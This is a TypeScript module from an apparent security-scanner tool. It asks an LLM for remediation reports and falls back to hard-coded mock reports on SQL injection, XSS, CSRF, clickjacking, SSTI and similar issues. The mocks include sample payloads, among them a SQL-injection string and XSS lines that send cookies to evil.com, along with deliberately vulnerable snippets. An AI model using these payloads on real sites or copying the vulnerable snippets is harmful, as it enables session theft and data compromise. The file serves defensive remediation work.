const CEREBRAS_BASE_URL = "https://api.cerebras.ai/v1";
const MODEL = "gpt-oss-120b";

let _rotatorIndex = 0;

function getApiKeys(): string[] {
    const keys = [
        process.env.CEREBRAS_API_KEY_1,
        process.env.CEREBRAS_API_KEY_2,
        process.env.CEREBRAS_API_KEY_3,
        process.env.CEREBRAS_API_KEY_4,
        process.env.CEREBRAS_API_KEY_5,
        // Legacy single key fallback
        process.env.CEREBRAS_API_KEY,
    ]
        .filter((k): k is string => !!k && k.trim() !== "" && k !== "undefined")
        .map((k) => k.trim());

    // Deduplicate in case single key and key_1 are the same
    return [...new Set(keys)];
}

function getNextKey(keys: string[]): { key: string; index: number } {
    const index = _rotatorIndex % keys.length;
    _rotatorIndex = (_rotatorIndex + 1) % keys.length;
    return { key: keys[index], index };
}

async function cerebrasRequest(
    payload: object,
    retryOnRateLimit = true
): Promise<Response> {
    const keys = getApiKeys();
    if (keys.length === 0) throw new Error("NO_KEYS");

    const { key, index } = getNextKey(keys);

    const resp = await fetch(`${CEREBRAS_BASE_URL}/chat/completions`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            Authorization: `Bearer ${key}`,
        },
        body: JSON.stringify(payload),
    });

    // If rate-limited and we have more keys, retry with next key
    if (resp.status === 429 && retryOnRateLimit && keys.length > 1) {
        console.warn(`⚠️ Cerebras key[${index + 1}] hit rate limit (429). Rotating to next key...`);
        return cerebrasRequest(payload, false); // one retry with next key
    }

    return resp;
}


export interface FixReport {
    title: string;
    explanation: string; // plain English: what happened, why it's dangerous
    attackSimulation: string; // what an attacker actually does
    fixSteps: string[]; // ordered remediation steps
    codeExample: {
        vulnerable: string;
        fixed: string;
        language: string;
    };
    references: string[]; // OWASP/CWE links
}

// Offline/Mock mode fallback to provide instant, detailed reports
function getMockFixReport(params: {
    findingType: string;
    url: string;
    parameter?: string;
    evidence?: string;
    cveId?: string;
}): FixReport {
    const type = params.findingType.toLowerCase();

    if (type.includes("sql") || type.includes("sqli")) {
        const isForm = type.includes("form");
        return {
            title: isForm ? "SQL Injection via Form Field" : "SQL Injection via URL Parameter",
            explanation: isForm
                ? `The application is vulnerable to SQL Injection via form field submission. The field "${params.parameter || "search"}" submits user input directly into a database query without sanitization. Attackers can type crafted payloads into the form to dump tables, bypass authentication, or delete data.`
                : `The application is vulnerable to SQL Injection because user-supplied input in the parameter "${params.parameter || "id"}" is concatenated directly into a database query. This allows an attacker to manipulate SQL syntax and execute unauthorized queries, potentially exposing, modifying, or deleting sensitive database records.`,
            attackSimulation: isForm
                ? `1. The attacker opens the form at: ${params.url}\n2. They type a payload into the "${params.parameter || "search"}" field: ' OR '1'='1\n3. On submit, the server executes the malformed SQL and either returns all rows or shows a database error confirming injection.`
                : `1. The attacker targets the URL: ${params.url}\n2. They supply a payload in the "${params.parameter || "id"}" parameter, such as: ' OR '1'='1\n3. The database interprets the payload as SQL logic, bypassing the password check or returning all records in the table.`,
            fixSteps: [
                "Use parameterized queries or prepared statements (e.g., Prisma ORM, pg-promise parameterized queries).",
                "Validate and strongly type all inputs server-side before passing to database layer.",
                "Never concatenate raw user input into SQL strings.",
                "Add a WAF rule to block common SQL injection signatures as a defense-in-depth measure."
            ],
            codeExample: {
                language: "typescript",
                vulnerable: `// VULNERABLE: Raw form input concatenated into SQL\nconst { search } = req.body;\nconst rows = await db.query(\`SELECT * FROM products WHERE name = '\${search}'\`);`,
                fixed: `// FIXED: Parameterized query via Prisma\nconst { search } = req.body;\nconst rows = await prisma.product.findMany({\n  where: { name: { contains: String(search) } }\n});`
            },
            references: [
                "https://owasp.org/www-community/attacks/SQL_Injection",
                "https://cwe.mitre.org/data/definitions/89.html"
            ]
        };
    }

    if (type.includes("xss") || type.includes("scripting")) {
        const isForm = type.includes("form");
        return {
            title: isForm ? "Reflected XSS via Form Input" : "Reflected Cross-Site Scripting (XSS)",
            explanation: isForm
                ? `The form field "${params.parameter || "search"}" at ${params.url} reflects submitted input back in the page response without HTML-encoding. An attacker can submit a form with a malicious script payload; when the server echoes it back, the browser executes the script in the victim's session.`
                : `The application fails to sanitize or encode query input from parameter "${params.parameter || "query"}" before rendering it in the HTML response. An attacker can craft a malicious URL containing JavaScript; when a victim visits it, the script runs in their browser context, allowing session hijack or data theft.`,
            attackSimulation: isForm
                ? `1. The attacker opens the form at ${params.url}.\n2. They type into the "${params.parameter || "search"}" field: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>\n3. On submit, the server includes the payload unencoded in the response.\n4. The victim's browser executes the script, sending their session cookie to the attacker.`
                : `1. The attacker crafts a link: ${params.url}?${params.parameter || "query"}=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>\n2. The attacker sends this link to a logged-in user.\n3. The user clicks it. The browser receives the payload and executes it, sending the user's session cookies to the attacker.`,
            fixSteps: [
                "HTML-encode all user-supplied values before inserting them into HTML responses (use he, DOMPurify, or framework-native escaping).",
                "Implement a strict Content-Security-Policy (CSP) that blocks inline scripts and restricts script sources.",
                "Avoid dangerouslySetInnerHTML in React/Next.js; always use JSX's built-in auto-escaping.",
                "Validate form inputs server-side and return errors rather than echoing raw input."
            ],
            codeExample: {
                language: "javascript",
                vulnerable: `// VULNERABLE: Form input echoed into HTML without encoding\napp.post('/search', (req, res) => {\n  res.send('<h1>Results for: ' + req.body.q + '</h1>');\n});`,
                fixed: `// FIXED: HTML-encode the input before rendering\nimport { escape } from 'html-escaper';\napp.post('/search', (req, res) => {\n  res.send('<h1>Results for: ' + escape(req.body.q) + '</h1>');\n});`
            },
            references: [
                "https://owasp.org/www-community/attacks/xss/",
                "https://cwe.mitre.org/data/definitions/79.html"
            ]
        };
    }

    if (type.includes("csrf")) {
        return {
            title: "Cross-Site Request Forgery (CSRF)",
            explanation: `The endpoint lacks anti-CSRF token protection or modern SameSite cookie configurations. A malicious third-party site can forge requests to this URL on behalf of an authenticated user, executing unauthorized actions (like updating passwords or emails).`,
            attackSimulation: `1. The attacker hosts an innocent-looking website containing an invisible form pointing to: ${params.url}\n2. The form triggers automatically on load via JS.\n3. A victim who is logged in to your app visits the attacker's site. Their browser submits the form, carrying their session cookies automatically, executing the action.`,
            fixSteps: [
                "Configure session cookies with 'SameSite=Lax' or 'SameSite=Strict' and 'Secure'.",
                "Implement unique, cryptographically secure anti-CSRF tokens for all state-changing endpoints (POST, PUT, DELETE).",
                "Verify headers like 'Origin' and 'Referer' on the server."
            ],
            codeExample: {
                language: "javascript",
                vulnerable: `// VULNERABLE: Express session cookie configured insecurely\napp.use(session({\n  cookie: { secure: false }\n}));`,
                fixed: `// FIXED: Strict SameSite and secure cookies\napp.use(session({\n  cookie: {\n    secure: true,\n    sameSite: 'lax',\n    httpOnly: true\n  }\n}));`
            },
            references: [
                "https://owasp.org/www-community/attacks/csrf",
                "https://cwe.mitre.org/data/definitions/352.html"
            ]
        };
    }

    if (type.includes("frame") || type.includes("clickjacking")) {
        return {
            title: "Missing Security Header: X-Frame-Options",
            explanation: `The 'X-Frame-Options' header is not configured on the web server. This allows this website to be embedded inside an <iframe> on a malicious third-party website, exposing users to clickjacking attacks where they are tricked into clicking invisible buttons.`,
            attackSimulation: `1. The attacker embeds your site inside an invisible iframe on their malicious page.\n2. The attacker overlays a dummy game button directly on top of your app's 'Delete Account' button.\n3. The victim clicks 'Play Game' but actually clicks 'Delete Account' on your website.`,
            fixSteps: [
                "Add 'X-Frame-Options: DENY' or 'X-Frame-Options: SAMEORIGIN' to all HTTP responses.",
                "Alternatively, configure a 'frame-ancestors' directive in your Content-Security-Policy (CSP) header."
            ],
            codeExample: {
                language: "typescript",
                vulnerable: `// VULNERABLE: next.config.js with no security headers configured`,
                fixed: `// FIXED: Configure security headers in next.config.ts\nexport default {\n  async headers() {\n    return [\n      {\n        source: '/(.*)',\n        headers: [\n          { key: 'X-Frame-Options', value: 'DENY' }\n        ]\n      }\n    ];\n  }\n};`
            },
            references: [
                "https://owasp.org/www-community/attacks/Clickjacking",
                "https://cwe.mitre.org/data/definitions/1021.html"
            ]
        };
    }

    if (type.includes("csp") || type.includes("content-security-policy")) {
        return {
            title: "Missing Content-Security-Policy (CSP)",
            explanation: "The server does not supply a Content-Security-Policy header. Without a CSP, the browser will execute any scripts, styles, or plugins injected into the page from any origin, significantly increasing the success of XSS and clickjacking attacks.",
            attackSimulation: "1. An attacker finds an input reflection point on the page.\n2. They inject a script loading malicious code from a third-party server.\n3. Since there is no CSP, the browser downloads and runs the script, compromising the user session.",
            fixSteps: [
                "Define a Content-Security-Policy header outlining trusted script sources (e.g., 'default-src 'self'').",
                "Start with a report-only CSP to detect violations before enforcing it."
            ],
            codeExample: {
                language: "typescript",
                vulnerable: "// VULNERABLE: CSP is not configured in response headers",
                fixed: `// FIXED: Configure CSP in next.config.ts\nexport default {\n  async headers() {\n    return [\n      {\n        source: '/(.*)',\n        headers: [\n          {\n            key: 'Content-Security-Policy',\n            value: "default-src 'self'; script-src 'self' 'unsafe-inline';"\n          }\n        ]\n      }\n    ];\n  }\n};`
            },
            references: [
                "https://owasp.org/www-community/controls/Content_Security_Policy",
                "https://cwe.mitre.org/data/definitions/1021.html"
            ]
        };
    }

    if (type.includes("ssti")) {
        return {
            title: "Server-Side Template Injection (SSTI)",
            explanation: "The application evaluates user-supplied input inside a server-side template engine without sanitization. An attacker can execute arbitrary code on the server by crafting template directives.",
            attackSimulation: "1. The attacker injects template syntax (e.g., {{7*7}}) into input parameters.\n2. The server evaluates the expression and returns the output (49).\n3. The attacker escalates to remote code execution.",
            fixSteps: [
                "Avoid passing user input directly into template render engines.",
                "Use safe context variables and strict output encoding."
            ],
            codeExample: {
                language: "javascript",
                vulnerable: "// VULNERABLE: Rendering raw user input as template string\nnunjucks.renderString(req.query.name);",
                fixed: "// FIXED: Pass input as context variable to pre-compiled template\nnunjucks.render('hello.html', { name: req.query.name });"
            },
            references: [
                "https://owasp.org/www-community/attacks/Command_Injection",
                "https://cwe.mitre.org/data/definitions/1336.html"
            ]
        };
    }

    if (type.includes("file-upload")) {
        return {
            title: "Insecure File Upload Vulnerability",
            explanation: "The file upload handler does not properly restrict or sanitize uploaded files, potentially allowing attackers to upload webshells or arbitrary files.",
            attackSimulation: "1. Attacker uploads a file with an executable extension or path traversal sequence.\n2. The server stores or executes the payload.",
            fixSteps: [
                "Validate file extension, MIME type, and magic bytes server-side.",
                "Store uploaded files outside web root or on isolated storage buckets (S3)."
            ],
            codeExample: {
                language: "typescript",
                vulnerable: "// VULNERABLE: Unvalidated file upload",
                fixed: "// FIXED: Validate allowed extensions and sanitize file names"
            },
            references: [
                "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
                "https://cwe.mitre.org/data/definitions/434.html"
            ]
        };
    }

    if (type.includes("api-endpoint-discovered")) {
        return {
            title: "API Surface Route Mapped",
            explanation: `An API endpoint route (${params.url}) was discovered during static JS asset analysis or network interception and added to the attack surface map for scanning.`,
            attackSimulation: "Automated mapping of API endpoints performed during security auditing to enumerate reachable endpoints.",
            fixSteps: [
                "Ensure authentication and authorization controls are enforced on sensitive backend routes.",
                "Apply rate limiting and access controls on public API endpoints."
            ],
            codeExample: {
                language: "typescript",
                vulnerable: "// Publicly reachable API route",
                fixed: "// Secure API route with authentication middleware"
            },
            references: [
                "https://owasp.org/www-project-api-security/"
            ]
        };
    }

    // Default fallback with human-readable title
    const humanTitle = params.findingType
        .replace(/[-_]+/g, ' ')
        .replace(/\b\w/g, (c) => c.toUpperCase());

    return {
        title: humanTitle,
        explanation: `Security finding detected: ${humanTitle} at ${params.url}.`,
        attackSimulation: `1. An attacker targets ${params.url} with crafted requests to exploit ${humanTitle}.`,
        fixSteps: [
            `Review and secure the implementation for ${humanTitle} on ${params.url}.`,
            "Apply least privilege and strict input validation server-side."
        ],
        codeExample: {
            language: "typescript",
            vulnerable: "// VULNERABLE: Unvalidated or insecure code logic",
            fixed: "// FIXED: Apply security controls and input validation"
        },
        references: [
            "https://owasp.org/www-project-top-ten/",
            "https://cwe.mitre.org/"
        ]
    };
}

export async function generateFixReport(params: {
    findingType: string;
    url: string;
    parameter?: string;
    evidence?: string;
    cveId?: string;
    ragContext: string;
}): Promise<FixReport> {
    const { findingType, url, parameter, evidence, cveId, ragContext } = params;

    // Gracefully handle missing API Keys (Offline / Mock Mode fallback)
    const availableKeys = getApiKeys();
    if (availableKeys.length === 0) {
        console.log(`🤖 No Cerebras API keys configured. Falling back to mock fix report for: "${findingType}"`);
        return getMockFixReport(params);
    }

    console.log(`🔑 Using Cerebras key rotator (${availableKeys.length} key(s) available). Current index: ${_rotatorIndex}.`);

    const systemPrompt = `You are a senior application security engineer. 
Your job is to produce clear, accurate security advisories for developers.
Always respond with valid JSON only — no markdown, no preamble.`;

    // Hard caps on variable-length fields to keep total prompt tokens well under the
    // Cerebras 64k limit. RAG context is also capped in rag.ts, but we guard here too.
    const safeEvidence = (evidence ?? "").slice(0, 300);
    const safeContext = ragContext.slice(0, 1200);

    const userPrompt = `
A vulnerability scanner found the following issue:

Type: ${findingType}
URL: ${url}
${parameter ? `Parameter: ${parameter}` : ""}
${safeEvidence ? `Evidence: ${safeEvidence}` : ""}
${cveId ? `CVE ID: ${cveId}` : ""}

--- REFERENCE CONTEXT (from OWASP / NVD / CWE knowledge base) ---
${safeContext}
--- END CONTEXT ---

Respond with a JSON object containing exactly these fields:
{
  "title": "Short title for this finding",
  "explanation": "2-3 sentence plain English explanation of what this vulnerability is and why it is dangerous",
  "attackSimulation": "Step by step description of how an attacker exploits this finding",
  "fixSteps": ["step 1", "step 2", "step 3"],
  "codeExample": {
    "vulnerable": "short vulnerable code snippet",
    "fixed": "corrected code snippet",
    "language": "language name"
  },
  "references": ["https://owasp.org/...", "https://cwe.mitre.org/..."]
}`;

    let response: Response;
    try {
        response = await cerebrasRequest({
            model: MODEL,
            max_tokens: 2500, // Increased to prevent truncation of complex JSON output
            temperature: 0.2,
            response_format: { type: "json_object" },
            messages: [
                { role: "system", content: systemPrompt },
                { role: "user", content: userPrompt },
            ],
        });
    } catch (e: any) {
        if (e.message === "NO_KEYS") return getMockFixReport(params);
        throw e;
    }

    if (!response.ok) {
        const err = await response.text();
        console.error(`Cerebras API error (${response.status}): ${err}. Falling back to mock.`);
        return getMockFixReport(params);
    }

    try {
        const data = await response.json();
        const raw = data?.choices?.[0]?.message?.content;
        if (!raw) {
            console.warn(`⚠️ Cerebras response format invalid or empty. Falling back to mock.`);
            return getMockFixReport(params);
        }

        const clean = (raw as string).replace(/```json|```/g, "").trim();

        try {
            return JSON.parse(clean) as FixReport;
        } catch (parseError) {
            // If the model hit max_tokens and truncated the response, try to repair the JSON
            try {
                // A basic heuristic to close truncated JSON objects or arrays at the end of the string
                let repaired = clean;
                if (repaired.lastIndexOf('"') > repaired.lastIndexOf('}')) repaired += '"';
                if (repaired.lastIndexOf('[') > repaired.lastIndexOf(']')) repaired += ']';
                repaired += '}';
                return JSON.parse(repaired) as FixReport;
            } catch (repairError) {
                console.warn(`⚠️ Failed to parse/repair Cerebras JSON response. Truncated output. Falling back to mock.`);
                return getMockFixReport(params);
            }
        }
    } catch (err: any) {
        console.error(`⚠️ Error parsing Cerebras API response: ${err?.message ?? String(err)}. Falling back to mock.`);
        return getMockFixReport(params);
    }
}

export async function answerFromContext(
    query: string,
    context: string
): Promise<string> {
    // Gracefully handle missing API Keys (Offline / Mock Mode fallback)
    const availableKeysForChat = getApiKeys();
    if (availableKeysForChat.length === 0) {
        console.log("🤖 No Cerebras API keys configured. Returning offline mock RAG response.");
        return `⚠️ **Offline Mode**: Add your Cerebras API keys to your \`.env\` file (CEREBRAS_API_KEY_1, _2, _3) to enable live AI answers.\n\nBased on the local security guidelines:\n${context.substring(0, 400)}...`;
    }

    let chatResponse: Response;
    try {
        chatResponse = await cerebrasRequest({
            model: MODEL,
            max_tokens: 600,
            temperature: 0.3,
            messages: [
                {
                    role: "system",
                    content: "You are a cybersecurity expert. Answer questions using only the provided context. Be concise and technical.",
                },
                {
                    role: "user",
                    content: `Context:\n${context.slice(0, 2000)}\n\nQuestion: ${query.slice(0, 300)}`,
                },
            ],
        });
    } catch (e: any) {
        if (e.message === "NO_KEYS") return "No API keys configured. Please add Cerebras API keys to your .env file.";
        throw e;
    }

    if (!chatResponse.ok) {
        const err = await chatResponse.text();
        throw new Error(`Cerebras API error: ${err}`);
    }

    const data = await chatResponse.json();
    return data.choices[0].message.content as string;
}